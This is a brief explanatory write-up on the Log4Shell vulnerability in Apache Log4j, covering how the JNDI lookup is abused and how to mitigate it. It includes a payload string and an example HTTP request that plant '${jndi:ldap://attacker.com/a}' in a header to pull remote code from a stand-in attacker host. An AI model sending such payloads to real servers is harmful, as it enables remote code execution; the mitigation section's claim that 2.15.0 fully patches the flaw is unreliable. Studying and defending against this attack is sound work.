# LOG4j Vulnerability

Log4j is a popular Java-based logging utility used in many applications to log messages for debugging and monitoring purposes. It is part of the Apache Logging Services and provides a flexible framework for logging in Java applications. Log4j allows developers to control logging levels, output formats, and destinations (such as console, files, or remote servers).

## How to Exploit Log4j (Log4Shell)
Exploiting the Log4j vulnerability typically involves sending a malicious payload that triggers the logging mechanism to perform a JNDI lookup, which can lead to remote code execution. Here’s how the exploitation process generally works:

- ### Identify Vulnerable Application:
  The attacker identifies an application that uses a vulnerable version of Log4j (versions 2.0 to 2.14.1).

- ### Craft Malicious Input:
 The attacker crafts a malicious input string that includes a JNDI lookup. For example:
```text
${jndi:ldap://attacker.com/a}
```
- ### Send Malicious Payload:
  The attacker sends this payload to the application in a way that it gets logged. This could be through HTTP headers, user input fields, or any other logging mechanism that the application uses.

Example: An attacker might send a request to a vulnerable web application:

```text
GET /some-endpoint HTTP/1.1
Host: vulnerable-app.com
User-Agent: ${jndi:ldap://attacker.com/a}
```
- ### Trigger JNDI Lookup:
  When Log4j processes the log message, it interprets the ${jndi:...} syntax and performs a JNDI lookup to the specified LDAP server (in this case, attacker.com).

- ### Execute Malicious Code:
  The attacker’s LDAP server responds with a reference to a malicious Java class. When the application loads this class, it executes arbitrary code on the server, leading to a full compromise.

## MITIGATION

- ### Upgrade Log4j:
  Update to the latest version of Log4j (2.15.0 or later) where the vulnerability is patched.

- ### Remove JNDI Lookup Feature:
- If upgrading is not immediately possible, consider disabling the JNDI lookup feature by setting the system property:
```text
log4j2.formatMsgNoLookups=true
```
